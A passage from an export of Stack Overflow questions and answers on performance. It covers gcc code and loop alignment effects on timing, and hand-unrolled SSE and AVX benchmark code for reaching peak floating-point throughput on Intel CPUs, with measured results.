<pre><code> 404,625,639 stalled-cycles-frontend   #    0.00% frontend cycles idle
      10,514 cache-misses
 0.375445137 seconds time elapsed
 [...]
 75.35%  a.out  a.out              [.] add(int const&amp;, int const&amp;) [clone .isra.0]                                                                                     ¦
 24.46%  a.out  a.out              [.] work(int, int)
 [...]
       ¦   __attribute__((noinline))
       ¦   static int add(const int&amp; x, const int&amp; y) {
 18.67 ¦     push   %rbp
       ¦       return x + y;
 18.49 ¦     lea    (%rdi,%rsi,1),%eax
       ¦   const int LOOP_BOUND = 200000000;
       ¦
       ¦   __attribute__((noinline))
       ¦   static int add(const int&amp; x, const int&amp; y) {
       ¦     mov    %rsp,%rbp
       ¦       return x + y;
       ¦   }
 12.71 ¦     pop    %rbp
       ¦   ? retq
 [...]
       ¦            int z = add(x, y);
       ¦    ? callq  add(int const&amp;, int const&amp;) [clone .isra.0]
       ¦            sum += z;
 29.83 ¦      add    %eax,%ebx
</code></pre>

<p>It looks like we are stalling on the call to <code>add()</code> in the slow case.</p>

<p>I have examined <em>everything</em> that <code>perf -e</code> can spit out on my machine; not just the stats that are given above.</p>

<p>For the same executable, the <code>stalled-cycles-frontend</code> shows linear correlation with the execution time; I did not notice anything else that would correlate so clearly. (Comparing <code>stalled-cycles-frontend</code> for different executables doesn't make sense to me.)</p>

<p>I included the cache misses as it came up as the first comment. I examined all the cache misses that can be measured on my machine by <code>perf</code>, not just the ones given above. The cache misses are very very noisy and show little to no correlation with the execution times.</p>
","<p>My colleague helped me find a plausible answer to my question. He noticed the importance of the 256 byte boundary. He is not registered here and encouraged me to post the answer myself (and take all the fame).</p>

<hr>

<p><strong>Short answer:</strong></p>

<blockquote>
  <p>Is it the padding that is the culprit in this case? Why and how?</p>
</blockquote>

<p><strong>It all boils down to alignment.</strong> Alignments can have a significant impact on the performance, that is why we have the <code>-falign-*</code> flags in the first place.</p>

<p>I have submitted <a href=""http://gcc.gnu.org/bugzilla/show_bug.cgi?id=58863"" rel=""noreferrer"">a (bogus?) bug report to the gcc developers</a>. It turns out that the default behavior is <em>""we align loops to 8 byte by default but try to align it to 16 byte if we don't need to fill in over 10 bytes.""</em> Apparently, this default is not the best choice in this particular case and on my machine. Clang 3.4 (trunk) with <code>-O3</code> does the appropriate alignment and the generated code does not show this weird behavior.</p>

<p>Of course, <strong>if an inappropriate alignment is done, it makes things worse.</strong> An unnecessary / bad alignment just eats up bytes for no reason and potentially increases cache misses, etc.</p>

<blockquote>
  <p>The noise it makes pretty much makes timing micro-optimizations
  impossible.</p>
  
  <p>How can I make sure that such accidental lucky / unlucky alignments
  are not interfering when I do micro-optimizations (unrelated to stack
  alignment) on C or C++ source codes?</p>
</blockquote>

<p><strong>Simply by telling gcc to do the right alignment:</strong></p>

<p><code>g++ -O2 -falign-functions=16 -falign-loops=16</code></p>

<hr>

<p><strong>Long answer:</strong></p>

<p>The code will run slower if:</p>

<ul>
<li><p>an <code>XX</code> byte boundary cuts <code>add()</code> in the middle (<code>XX</code> being machine dependent).</p></li>
<li><p>if the call to <code>add()</code> has to jump over an <code>XX</code> byte boundary and the target is not aligned.</p></li>
<li><p>if  <code>add()</code> is not aligned.</p></li>
<li><p>if the loop is not aligned.</p></li>
</ul>

<p>The first 2 are beautifully visible on the codes and results that <a href=""https://stackoverflow.com/a/19471823/341970"">Marat Dukhan kindly posted</a>. In this case, <code>gcc-4.8.1 -Os</code> (executes in 0.994 secs):</p>

<pre><code>00000000004004fd &lt;_ZL3addRKiS0_.isra.0&gt;:
  4004fd:       8d 04 37                lea    eax,[rdi+rsi*1]
  400500:       c3   
</code></pre>

<p>a 256 byte boundary cuts <code>add()</code> right in the middle and neither <code>add()</code> nor the loop is aligned. Surprise, surprise, this is the slowest case!</p>

<p>In case <code>gcc-4.7.3 -Os</code> (executes in 0.822 secs), the 256 byte boundary only cuts into a cold section (but neither the loop, nor <code>add()</code> is cut):</p>

<pre><code>00000000004004fa &lt;_ZL3addRKiS0_.isra.0&gt;:
  4004fa:       8d 04 37                lea    eax,[rdi+rsi*1]
  4004fd:       c3                      ret

[...]

  40051a:       e8 db ff ff ff          call   4004fa &lt;_ZL3addRKiS0_.isra.0&gt;
</code></pre>

<p>Nothing is aligned, and the call to <code>add()</code> has to jump over the 256 byte boundary. This code is the second slowest.</p>

<p>In case <code>gcc-4.6.4 -Os</code> (executes in 0.709 secs), although nothing is aligned, the call to <code>add()</code> doesn't have to jump over the 256 byte boundary and the target is exactly 32 byte away:</p>

<pre><code>  4004f2:       e8 db ff ff ff          call   4004d2 &lt;_ZL3addRKiS0_.isra.0&gt;
  4004f7:       01 c3                   add    ebx,eax
  4004f9:       ff cd                   dec    ebp
  4004fb:       75 ec                   jne    4004e9 &lt;_ZL4workii+0x13&gt;
</code></pre>

<p>This is the fastest of all three. Why the 256 byte boundary is speacial on his machine, I will leave it up to him to figure it out. I don't have such a processor.</p>

<p>Now, on my machine I don't get this 256 byte boundary effect. Only the function and the loop alignment kicks in on my machine. If I pass <code>g++ -O2 -falign-functions=16 -falign-loops=16</code> then everything is back to normal: I always get the fastest case and the time isn't sensitive to the <code>-fno-omit-frame-pointer</code> flag anymore. I can pass <code>g++ -O2 -falign-functions=32 -falign-loops=32</code> or any multiples of 16, the code is not sensitive to that either.</p>

<blockquote>
  <p>I first noticed in 2009 that gcc (at least on my projects and on my
  machines) have the tendency to generate noticeably faster code if I
  optimize for size (-Os) instead of speed (-O2 or -O3) and I have been
  wondering ever since why.</p>
</blockquote>

<p>A likely explanation is that I had hotspots which were sensitive to the alignment, just like the one in this example. By messing with the flags (passing <code>-Os</code> instead of <code>-O2</code>), those hotspots were aligned in a lucky way by accident and the code became faster. <strong>It had nothing to do with optimizing for size: These were by sheer accident that the hotspots got aligned better.</strong> From now on, I will check the effects of alignment on my projects.</p>

<p>Oh, and one more thing. <strong>How can such hotspots arise, like the one shown in the example? How can the inlining of such a tiny function like <code>add()</code> fail?</strong></p>

<p>Consider this:</p>

<pre><code>// add.cpp
int add(const int&amp; x, const int&amp; y) {
    return x + y;
}
</code></pre>

<p>and in a separate file:</p>

<pre><code>// main.cpp
int add(const int&amp; x, const int&amp; y);

const int LOOP_BOUND = 200000000;

__attribute__((noinline))
static int work(int xval, int yval) {
    int sum(0);
    for (int i=0; i&lt;LOOP_BOUND; ++i) {
        int x(xval+sum);
        int y(yval+sum);
        int z = add(x, y);
        sum += z;
    }
    return sum;
}

int main(int , char* argv[]) {
    int result = work(*argv[1], *argv[2]);
    return result;
}
</code></pre>

<p>and compiled as: <code>g++ -O2 add.cpp main.cpp</code>. </p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>gcc won't inline <code>add()</code>!</strong></p>

<p>That's all, it's that easy to  unintendedly create hotspots like the one in the OP. <strong>Of course it is partly my fault: gcc is an excellent compiler.</strong> If compile the above as: <code>g++ -O2 -flto add.cpp main.cpp</code>, that is, <strong>if I perform link time optimization, the code runs in 0.19s!</strong> </p>

<p>(Inlining is artificially disabled in the OP, hence, the code in the OP was 2x slower).</p>
","19570226"
"How do I achieve the theoretical maximum of 4 FLOPs per cycle?","60414","","<p>How can the theoretical peak performance of 4 floating point operations (double precision) per cycle be achieved on a modern x86-64 Intel CPU?</p>

<p>As far as I understand it take three cycles for an <a href=""https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions"">SSE</a> <code>add</code> and five cycles for a <code>mul</code> to complete on most of the modern Intel CPUs (see for example <a href=""http://agner.org/optimize/instruction_tables.pdf"">Agner Fog's 'Instruction Tables'</a> ). Due to pipelining one can get a throughput of one <code>add</code> per cycle if the algorithm has at least three independent summations. Since that is true for packed <code>addpd</code> as well as the scalar <code>addsd</code> versions and SSE registers can contain two <code>double</code>'s the throughput can be as much as two flops per cycle.</p>

<p>Furthermore, it seems (although I've not seen any proper documentation on this) <code>add</code>'s and <code>mul</code>'s can be executed in parallel giving a theoretical max throughput of four flops per cycle.</p>

<p>However, I've not been able to replicate that performance with a simple C/C++ programme. My best attempt resulted in about 2.7 flops/cycle. If anyone can contribute a simple C/C++ or assembler programme which demonstrates peak performance that'd be greatly appreciated.</p>

<p>My attempt:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;
#include &lt;sys/time.h&gt;

double stoptime(void) {
   struct timeval t;
   gettimeofday(&amp;t,NULL);
   return (double) t.tv_sec + t.tv_usec/1000000.0;
}

double addmul(double add, double mul, int ops){
   // Need to initialise differently otherwise compiler might optimise away
   double sum1=0.1, sum2=-0.1, sum3=0.2, sum4=-0.2, sum5=0.0;
   double mul1=1.0, mul2= 1.1, mul3=1.2, mul4= 1.3, mul5=1.4;
   int loops=ops/10;          // We have 10 floating point operations inside the loop
   double expected = 5.0*add*loops + (sum1+sum2+sum3+sum4+sum5)
               + pow(mul,loops)*(mul1+mul2+mul3+mul4+mul5);

   for (int i=0; i&lt;loops; i++) {
      mul1*=mul; mul2*=mul; mul3*=mul; mul4*=mul; mul5*=mul;
      sum1+=add; sum2+=add; sum3+=add; sum4+=add; sum5+=add;
   }
   return  sum1+sum2+sum3+sum4+sum5+mul1+mul2+mul3+mul4+mul5 - expected;
}

int main(int argc, char** argv) {
   if (argc != 2) {
      printf(""usage: %s &lt;num&gt;\n"", argv[0]);
      printf(""number of operations: &lt;num&gt; millions\n"");
      exit(EXIT_FAILURE);
   }
   int n = atoi(argv[1]) * 1000000;
   if (n&lt;=0)
       n=1000;

   double x = M_PI;
   double y = 1.0 + 1e-8;
   double t = stoptime();
   x = addmul(x, y, n);
   t = stoptime() - t;
   printf(""addmul:\t %.3f s, %.3f Gflops, res=%f\n"", t, (double)n/t/1e9, x);
   return EXIT_SUCCESS;
}
</code></pre>

<p>Compiled with</p>

<pre><code>g++ -O2 -march=native addmul.cpp ; ./a.out 1000
</code></pre>

<p>produces the following output on an Intel Core i5-750, 2.66&nbsp;GHz.</p>

<pre><code>addmul:  0.270 s, 3.707 Gflops, res=1.326463
</code></pre>

<p>That is, just about 1.4 flops per cycle. Looking at the assembler code with
<code>g++ -S -O2 -march=native -masm=intel addmul.cpp</code> the main loop seems kind of
optimal to me:</p>

<pre><code>.L4:
inc    eax
mulsd    xmm8, xmm3
mulsd    xmm7, xmm3
mulsd    xmm6, xmm3
mulsd    xmm5, xmm3
mulsd    xmm1, xmm3
addsd    xmm13, xmm2
addsd    xmm12, xmm2
addsd    xmm11, xmm2
addsd    xmm10, xmm2
addsd    xmm9, xmm2
cmp    eax, ebx
jne    .L4
</code></pre>

<p>Changing the scalar versions with packed versions (<code>addpd</code> and <code>mulpd</code>) would double the flop count without changing the execution time and so I'd get just short of 2.8 flops per cycle. Is there a simple example which achieves four flops per cycle?</p>

<p>Nice little programme by Mysticial; here are my results (run just for a few seconds though):</p>

<ul>
<li><code>gcc -O2 -march=nocona</code>: 5.6 Gflops out of 10.66 Gflops (2.1 flops/cycle)</li>
<li><code>cl /O2</code>, openmp removed: 10.1 Gflops out of 10.66 Gflops (3.8 flops/cycle)</li>
</ul>

<p>It all seems a bit complex, but my conclusions so far:</p>

<ul>
<li><p><code>gcc -O2</code> changes the order of independent floating point operations with
the aim of alternating
<code>addpd</code> and <code>mulpd</code>'s if possible. Same applies to <code>gcc-4.6.2 -O2 -march=core2</code>.</p></li>
<li><p><code>gcc -O2 -march=nocona</code> seems to keep the order of floating point operations as defined in
the C++ source.</p></li>
<li><p><code>cl /O2</code>, the 64-bit compiler from the
<a href=""http://www.microsoft.com/download/en/details.aspx?id=3138"">SDK for Windows 7</a>
does loop-unrolling automatically and seems to try and arrange operations
so that groups of three <code>addpd</code>'s alternate with three <code>mulpd</code>'s (well, at least on my system and for my simple programme).</p></li>
<li><p>My <a href=""http://en.wikipedia.org/wiki/List_of_Intel_Core_i5_microprocessors#Based_on_Nehalem_microarchitecture"">Core i5 750</a> (<a href=""http://en.wikipedia.org/wiki/Nehalem_%28microarchitecture%29"">Nahelem architecture</a>)
doesn't like alternating add's and mul's and seems unable
to run both operations in parallel. However, if grouped in 3's it suddenly works like magic.</p></li>
<li><p>Other architectures (possibly <a href=""http://en.wikipedia.org/wiki/Sandy_bridge"">Sandy Bridge</a> and others) appear to
be able to execute add/mul in parallel without problems
if they alternate in the assembly code.</p></li>
<li><p>Although difficult to admit, but on my system <code>cl /O2</code> does a much better job at low-level optimising operations for my system and achieves close to peak performance for the little C++ example above. I measured between
1.85-2.01 flops/cycle (have used clock() in Windows which is not that precise. I guess, need to use a better timer - thanks Mackie Messer).</p></li>
<li><p>The best I managed  with <code>gcc</code> was to manually loop unroll and arrange
additions and multiplications in groups of three. With
<code>g++ -O2 -march=nocona  addmul_unroll.cpp</code>
I get at best <code>0.207s, 4.825 Gflops</code> which corresponds to 1.8 flops/cycle
which I'm quite happy with now.</p></li>
</ul>

<p>In the C++ code I've replaced the <code>for</code> loop with</p>

<pre><code>   for (int i=0; i&lt;loops/3; i++) {
       mul1*=mul; mul2*=mul; mul3*=mul;
       sum1+=add; sum2+=add; sum3+=add;
       mul4*=mul; mul5*=mul; mul1*=mul;
       sum4+=add; sum5+=add; sum1+=add;

       mul2*=mul; mul3*=mul; mul4*=mul;
       sum2+=add; sum3+=add; sum4+=add;
       mul5*=mul; mul1*=mul; mul2*=mul;
       sum5+=add; sum1+=add; sum2+=add;

       mul3*=mul; mul4*=mul; mul5*=mul;
       sum3+=add; sum4+=add; sum5+=add;
   }
</code></pre>

<p>And the assembly now looks like</p>

<pre><code>.L4:
mulsd    xmm8, xmm3
mulsd    xmm7, xmm3
mulsd    xmm6, xmm3
addsd    xmm13, xmm2
addsd    xmm12, xmm2
addsd    xmm11, xmm2
mulsd    xmm5, xmm3
mulsd    xmm1, xmm3
mulsd    xmm8, xmm3
addsd    xmm10, xmm2
addsd    xmm9, xmm2
addsd    xmm13, xmm2
...
</code></pre>
","<p>I've done this exact task before. But it was mainly to measure power consumption and CPU temperatures. The following code (which is fairly long) achieves close to optimal on my Core i7 2600K.</p>

<p>The key thing to note here is the massive amount of manual loop-unrolling as well as interleaving of multiplies and adds...</p>

<p>The full project can be found on my GitHub: <a href=""https://github.com/Mysticial/Flops"">https://github.com/Mysticial/Flops</a></p>

<h1>Warning:</h1>

<p><strong>If you decide to compile and run this, pay attention to your CPU temperatures!!!</strong><br>Make sure you don't overheat it. And make sure CPU-throttling doesn't affect your results!</p>

<p>Furthermore, I take no responsibility for whatever damage that may result from running this code.</p>

<p><strong>Notes:</strong></p>

<ul>
<li>This code is optimized for x64. x86 doesn't have enough registers for this to compile well.</li>
<li>This code has been tested to work well on Visual Studio 2010/2012 and GCC 4.6.<br>ICC 11 (Intel Compiler 11) surprisingly has trouble compiling it well.</li>
<li>These are for pre-FMA processors. In order to achieve peak FLOPS on Intel Haswell and AMD Bulldozer processors (and later), FMA (Fused Multiply Add) instructions will be needed. These are beyond the scope of this benchmark.</li>
</ul>

<p></p>

<pre><code>#include &lt;emmintrin.h&gt;
#include &lt;omp.h&gt;
#include &lt;iostream&gt;
using namespace std;

typedef unsigned long long uint64;

double test_dp_mac_SSE(double x,double y,uint64 iterations){
    register __m128d r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,rA,rB,rC,rD,rE,rF;

    //  Generate starting data.
    r0 = _mm_set1_pd(x);
    r1 = _mm_set1_pd(y);

    r8 = _mm_set1_pd(-0.0);

    r2 = _mm_xor_pd(r0,r8);
    r3 = _mm_or_pd(r0,r8);
    r4 = _mm_andnot_pd(r8,r0);
    r5 = _mm_mul_pd(r1,_mm_set1_pd(0.37796447300922722721));
    r6 = _mm_mul_pd(r1,_mm_set1_pd(0.24253562503633297352));
    r7 = _mm_mul_pd(r1,_mm_set1_pd(4.1231056256176605498));
    r8 = _mm_add_pd(r0,_mm_set1_pd(0.37796447300922722721));
    r9 = _mm_add_pd(r1,_mm_set1_pd(0.24253562503633297352));
    rA = _mm_sub_pd(r0,_mm_set1_pd(4.1231056256176605498));
    rB = _mm_sub_pd(r1,_mm_set1_pd(4.1231056256176605498));

    rC = _mm_set1_pd(1.4142135623730950488);
    rD = _mm_set1_pd(1.7320508075688772935);
    rE = _mm_set1_pd(0.57735026918962576451);
    rF = _mm_set1_pd(0.70710678118654752440);

    uint64 iMASK = 0x800fffffffffffffull;
    __m128d MASK = _mm_set1_pd(*(double*)&amp;iMASK);
    __m128d vONE = _mm_set1_pd(1.0);

    uint64 c = 0;
    while (c &lt; iterations){
        size_t i = 0;
        while (i &lt; 1000){
            //  Here's the meat - the part that really matters.

            r0 = _mm_mul_pd(r0,rC);
            r1 = _mm_add_pd(r1,rD);
            r2 = _mm_mul_pd(r2,rE);
            r3 = _mm_sub_pd(r3,rF);
            r4 = _mm_mul_pd(r4,rC);
            r5 = _mm_add_pd(r5,rD);
            r6 = _mm_mul_pd(r6,rE);
            r7 = _mm_sub_pd(r7,rF);
            r8 = _mm_mul_pd(r8,rC);
            r9 = _mm_add_pd(r9,rD);
            rA = _mm_mul_pd(rA,rE);
            rB = _mm_sub_pd(rB,rF);

            r0 = _mm_add_pd(r0,rF);
            r1 = _mm_mul_pd(r1,rE);
            r2 = _mm_sub_pd(r2,rD);
            r3 = _mm_mul_pd(r3,rC);
            r4 = _mm_add_pd(r4,rF);
            r5 = _mm_mul_pd(r5,rE);
            r6 = _mm_sub_pd(r6,rD);
            r7 = _mm_mul_pd(r7,rC);
            r8 = _mm_add_pd(r8,rF);
            r9 = _mm_mul_pd(r9,rE);
            rA = _mm_sub_pd(rA,rD);
            rB = _mm_mul_pd(rB,rC);

            r0 = _mm_mul_pd(r0,rC);
            r1 = _mm_add_pd(r1,rD);
            r2 = _mm_mul_pd(r2,rE);
            r3 = _mm_sub_pd(r3,rF);
            r4 = _mm_mul_pd(r4,rC);
            r5 = _mm_add_pd(r5,rD);
            r6 = _mm_mul_pd(r6,rE);
            r7 = _mm_sub_pd(r7,rF);
            r8 = _mm_mul_pd(r8,rC);
            r9 = _mm_add_pd(r9,rD);
            rA = _mm_mul_pd(rA,rE);
            rB = _mm_sub_pd(rB,rF);

            r0 = _mm_add_pd(r0,rF);
            r1 = _mm_mul_pd(r1,rE);
            r2 = _mm_sub_pd(r2,rD);
            r3 = _mm_mul_pd(r3,rC);
            r4 = _mm_add_pd(r4,rF);
            r5 = _mm_mul_pd(r5,rE);
            r6 = _mm_sub_pd(r6,rD);
            r7 = _mm_mul_pd(r7,rC);
            r8 = _mm_add_pd(r8,rF);
            r9 = _mm_mul_pd(r9,rE);
            rA = _mm_sub_pd(rA,rD);
            rB = _mm_mul_pd(rB,rC);

            i++;
        }

        //  Need to renormalize to prevent denormal/overflow.
        r0 = _mm_and_pd(r0,MASK);
        r1 = _mm_and_pd(r1,MASK);
        r2 = _mm_and_pd(r2,MASK);
        r3 = _mm_and_pd(r3,MASK);
        r4 = _mm_and_pd(r4,MASK);
        r5 = _mm_and_pd(r5,MASK);
        r6 = _mm_and_pd(r6,MASK);
        r7 = _mm_and_pd(r7,MASK);
        r8 = _mm_and_pd(r8,MASK);
        r9 = _mm_and_pd(r9,MASK);
        rA = _mm_and_pd(rA,MASK);
        rB = _mm_and_pd(rB,MASK);
        r0 = _mm_or_pd(r0,vONE);
        r1 = _mm_or_pd(r1,vONE);
        r2 = _mm_or_pd(r2,vONE);
        r3 = _mm_or_pd(r3,vONE);
        r4 = _mm_or_pd(r4,vONE);
        r5 = _mm_or_pd(r5,vONE);
        r6 = _mm_or_pd(r6,vONE);
        r7 = _mm_or_pd(r7,vONE);
        r8 = _mm_or_pd(r8,vONE);
        r9 = _mm_or_pd(r9,vONE);
        rA = _mm_or_pd(rA,vONE);
        rB = _mm_or_pd(rB,vONE);

        c++;
    }

    r0 = _mm_add_pd(r0,r1);
    r2 = _mm_add_pd(r2,r3);
    r4 = _mm_add_pd(r4,r5);
    r6 = _mm_add_pd(r6,r7);
    r8 = _mm_add_pd(r8,r9);
    rA = _mm_add_pd(rA,rB);

    r0 = _mm_add_pd(r0,r2);
    r4 = _mm_add_pd(r4,r6);
    r8 = _mm_add_pd(r8,rA);

    r0 = _mm_add_pd(r0,r4);
    r0 = _mm_add_pd(r0,r8);


    //  Prevent Dead Code Elimination
    double out = 0;
    __m128d temp = r0;
    out += ((double*)&amp;temp)[0];
    out += ((double*)&amp;temp)[1];

    return out;
}

void test_dp_mac_SSE(int tds,uint64 iterations){

    double *sum = (double*)malloc(tds * sizeof(double));
    double start = omp_get_wtime();

#pragma omp parallel num_threads(tds)
    {
        double ret = test_dp_mac_SSE(1.1,2.1,iterations);
        sum[omp_get_thread_num()] = ret;
    }

    double secs = omp_get_wtime() - start;
    uint64 ops = 48 * 1000 * iterations * tds * 2;
    cout &lt;&lt; ""Seconds = "" &lt;&lt; secs &lt;&lt; endl;
    cout &lt;&lt; ""FP Ops  = "" &lt;&lt; ops &lt;&lt; endl;
    cout &lt;&lt; ""FLOPs   = "" &lt;&lt; ops / secs &lt;&lt; endl;

    double out = 0;
    int c = 0;
    while (c &lt; tds){
        out += sum[c++];
    }

    cout &lt;&lt; ""sum = "" &lt;&lt; out &lt;&lt; endl;
    cout &lt;&lt; endl;

    free(sum);
}

int main(){
    //  (threads, iterations)
    test_dp_mac_SSE(8,10000000);

    system(""pause"");
}
</code></pre>

<p><strong>Output (1 thread, 10000000 iterations) - Compiled with Visual Studio 2010 SP1 - x64 Release:</strong></p>

<pre><code>Seconds = 55.5104
FP Ops  = 960000000000
FLOPs   = 1.7294e+010
sum = 2.22652
</code></pre>

<p>The machine is a Core i7 2600K @ 4.4 GHz. Theoretical SSE peak is 4 flops * 4.4 GHz = <strong>17.6 GFlops</strong>. This code achieves <strong>17.3 GFlops</strong> - not bad.</p>

<p><strong>Output (8 threads, 10000000 iterations) - Compiled with Visual Studio 2010 SP1 - x64 Release:</strong></p>

<pre><code>Seconds = 117.202
FP Ops  = 7680000000000
FLOPs   = 6.55279e+010
sum = 17.8122
</code></pre>

<p>Theoretical SSE peak is 4 flops * 4 cores * 4.4 GHz = <strong>70.4 GFlops.</strong> Actual is <strong>65.5 GFlops</strong>.</p>

<hr>

<h2>Let's take this one step further. AVX...</h2>

<pre><code>#include &lt;immintrin.h&gt;
#include &lt;omp.h&gt;
#include &lt;iostream&gt;
using namespace std;

typedef unsigned long long uint64;

double test_dp_mac_AVX(double x,double y,uint64 iterations){
    register __m256d r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,rA,rB,rC,rD,rE,rF;

    //  Generate starting data.
    r0 = _mm256_set1_pd(x);
    r1 = _mm256_set1_pd(y);

    r8 = _mm256_set1_pd(-0.0);

    r2 = _mm256_xor_pd(r0,r8);
    r3 = _mm256_or_pd(r0,r8);
    r4 = _mm256_andnot_pd(r8,r0);
    r5 = _mm256_mul_pd(r1,_mm256_set1_pd(0.37796447300922722721));
    r6 = _mm256_mul_pd(r1,_mm256_set1_pd(0.24253562503633297352));
    r7 = _mm256_mul_pd(r1,_mm256_set1_pd(4.1231056256176605498));
    r8 = _mm256_add_pd(r0,_mm256_set1_pd(0.37796447300922722721));
    r9 = _mm256_add_pd(r1,_mm256_set1_pd(0.24253562503633297352));
    rA = _mm256_sub_pd(r0,_mm256_set1_pd(4.1231056256176605498));
    rB = _mm256_sub_pd(r1,_mm256_set1_pd(4.1231056256176605498));

    rC = _mm256_set1_pd(1.4142135623730950488);
    rD = _mm256_set1_pd(1.7320508075688772935);
    rE = _mm256_set1_pd(0.57735026918962576451);
    rF = _mm256_set1_pd(0.70710678118654752440);

    uint64 iMASK = 0x800fffffffffffffull;
    __m256d MASK = _mm256_set1_pd(*(double*)&amp;iMASK);
    __m256d vONE = _mm256_set1_pd(1.0);

    uint64 c = 0;
    while (c &lt; iterations){
        size_t i = 0;
        while (i &lt; 1000){
            //  Here's the meat - the part that really matters.

            r0 = _mm256_mul_pd(r0,rC);
            r1 = _mm256_add_pd(r1,rD);
            r2 = _mm256_mul_pd(r2,rE);
            r3 = _mm256_sub_pd(r3,rF);
            r4 = _mm256_mul_pd(r4,rC);
            r5 = _mm256_add_pd(r5,rD);
            r6 = _mm256_mul_pd(r6,rE);
            r7 = _mm256_sub_pd(r7,rF);
            r8 = _mm256_mul_pd(r8,rC);
            r9 = _mm256_add_pd(r9,rD);
            rA = _mm256_mul_pd(rA,rE);
            rB = _mm256_sub_pd(rB,rF);

            r0 = _mm256_add_pd(r0,rF);
            r1 = _mm256_mul_pd(r1,rE);
            r2 = _mm256_sub_pd(r2,rD);
            r3 = _mm256_mul_pd(r3,rC);
            r4 = _mm256_add_pd(r4,rF);
            r5 = _mm256_mul_pd(r5,rE);
            r6 = _mm256_sub_pd(r6,rD);
            r7 = _mm256_mul_pd(r7,rC);
            r8 = _mm256_add_pd(r8,rF);
            r9 = _mm256_mul_pd(r9,rE);
            rA = _mm256_sub_pd(rA,rD);
            rB = _mm256_mul_pd(rB,rC);

            r0 = _mm256_mul_pd(r0,rC);
            r1 = _mm256_add_pd(r1,rD);
            r2 = _mm256_mul_pd(r2,rE);
            r3 = _mm256_sub_pd(r3,rF);
            r4 = _mm256_mul_pd(r4,rC);
            r5 = _mm256_add_pd(r5,rD);
            r6 = _mm256_mul_pd(r6,rE);
            r7 = _mm256_sub_pd(r7,rF);
            r8 = _mm256_mul_pd(r8,rC);
            r9 = _mm256_add_pd(r9,rD);
            rA = _mm256_mul_pd(rA,rE);
            rB = _mm256_sub_pd(rB,rF);

            r0 = _mm256_add_pd(r0,rF);
            r1 = _mm256_mul_pd(r1,rE);
            r2 = _mm256_sub_pd(r2,rD);
            r3 = _mm256_mul_pd(r3,rC);
            r4 = _mm256_add_pd(r4,rF);
            r5 = _mm256_mul_pd(r5,rE);
            r6 = _mm256_sub_pd(r6,rD);
            r7 = _mm256_mul_pd(r7,rC);
            r8 = _mm256_add_pd(r8,rF);
            r9 = _mm256_mul_pd(r9,rE);
            rA = _mm256_sub_pd(rA,rD);
            rB = _mm256_mul_pd(rB,rC);

            i++;
        }

        //  Need to renormalize to prevent denormal/overflow.
        r0 = _mm256_and_pd(r0,MASK);
        r1 = _mm256_and_pd(r1,MASK);
        r2 = _mm256_and_pd(r2,MASK);
        r3 = _mm256_and_pd(r3,MASK);
        r4 = _mm256_and_pd(r4,MASK);
        r5 = _mm256_and_pd(r5,MASK);
        r6 = _mm256_and_pd(r6,MASK);
        r7 = _mm256_and_pd(r7,MASK);
        r8 = _mm256_and_pd(r8,MASK);
        r9 = _mm256_and_pd(r9,MASK);
        rA = _mm256_and_pd(rA,MASK);
        rB = _mm256_and_pd(rB,MASK);
        r0 = _mm256_or_pd(r0,vONE);
        r1 = _mm256_or_pd(r1,vONE);
        r2 = _mm256_or_pd(r2,vONE);
        r3 = _mm256_or_pd(r3,vONE);
        r4 = _mm256_or_pd(r4,vONE);
        r5 = _mm256_or_pd(r5,vONE);
        r6 = _mm256_or_pd(r6,vONE);
        r7 = _mm256_or_pd(r7,vONE);
        r8 = _mm256_or_pd(r8,vONE);
        r9 = _mm256_or_pd(r9,vONE);
        rA = _mm256_or_pd(rA,vONE);
        rB = _mm256_or_pd(rB,vONE);

        c++;
    }

    r0 = _mm256_add_pd(r0,r1);
    r2 = _mm256_add_pd(r2,r3);
    r4 = _mm256_add_pd(r4,r5);
    r6 = _mm256_add_pd(r6,r7);
    r8 = _mm256_add_pd(r8,r9);
    rA = _mm256_add_pd(rA,rB);

    r0 = _mm256_add_pd(r0,r2);
    r4 = _mm256_add_pd(r4,r6);
    r8 = _mm256_add_pd(r8,rA);

    r0 = _mm256_add_pd(r0,r4);
    r0 = _mm256_add_pd(r0,r8);

    //  Prevent Dead Code Elimination
    double out = 0;
    __m256d temp = r0;
    out += ((double*)&amp;temp)[0];
    out += ((double*)&amp;temp)[1];
    out += ((double*)&amp;temp)[2];
    out += ((double*)&amp;temp)[3];

    return out;
}

void test_dp_mac_AVX(int tds,uint64 iterations){

    double *sum = (double*)malloc(tds * sizeof(double));
    double start = omp_get_wtime();

#pragma omp parallel num_threads(tds)
    {
        double ret = test_dp_mac_AVX(1.1,2.1,iterations);
        sum[omp_get_thread_num()] = ret;
    }

    double secs = omp_get_wtime() - start;
    uint64 ops = 48 * 1000 * iterations * tds * 4;
    cout &lt;&lt; ""Seconds = "" &lt;&lt; secs &lt;&lt; endl;
    cout &lt;&lt; ""FP Ops  = "" &lt;&lt; ops &lt;&lt; endl;
    cout &lt;&lt; ""FLOPs   = "" &lt;&lt; ops / secs &lt;&lt; endl;

    double out = 0;
    int c = 0;
    while (c &lt; tds){
        out += sum[c++];
    }

    cout &lt;&lt; ""sum = "" &lt;&lt; out &lt;&lt; endl;
    cout &lt;&lt; endl;

    free(sum);
}

int main(){
    //  (threads, iterations)
    test_dp_mac_AVX(8,10000000);

    system(""pause"");
}
</code></pre>

<p><strong>Output (1 thread, 10000000 iterations) - Compiled with Visual Studio 2010 SP1 - x64 Release:</strong></p>

<pre><code>Seconds = 57.4679
FP Ops  = 1920000000000
FLOPs   = 3.34099e+010
sum = 4.45305
</code></pre>

<p>Theoretical AVX peak is 8 flops * 4.4 GHz = <strong>35.2 GFlops</strong>. Actual is <strong>33.4 GFlops</strong>.</p>

<p><strong>Output (8 threads, 10000000 iterations) - Compiled with Visual Studio 2010 SP1 - x64 Release:</strong></p>

<pre><code>Seconds = 111.119
FP Ops  = 15360000000000
FLOPs   = 1.3823e+011
sum = 35.6244
</code></pre>

<p>Theoretical AVX peak is 8 flops * 4 cores * 4.4 GHz = <strong>140.8 GFlops.</strong> Actual is <strong>138.2 GFlops</strong>.</p>

<hr>

<p><strong>Now for some explanations:</strong></p>

